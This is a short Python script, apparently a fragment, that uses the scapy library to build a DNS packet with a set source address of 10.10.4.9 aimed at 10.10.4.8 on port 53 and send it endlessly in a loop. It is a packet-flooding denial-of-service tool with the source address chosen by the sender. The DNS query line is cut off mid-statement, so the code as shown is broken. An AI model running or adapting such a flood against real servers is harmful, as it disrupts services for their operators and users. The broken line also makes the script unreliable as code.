import sys
import random
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import argparse
import os
import urllib2
mypacket = IP(dst="10.10.4.8", src="10.10.4.9")/UDP(dport=53, sport=8000)/DNS(q$
while True:
        send(mypacket)
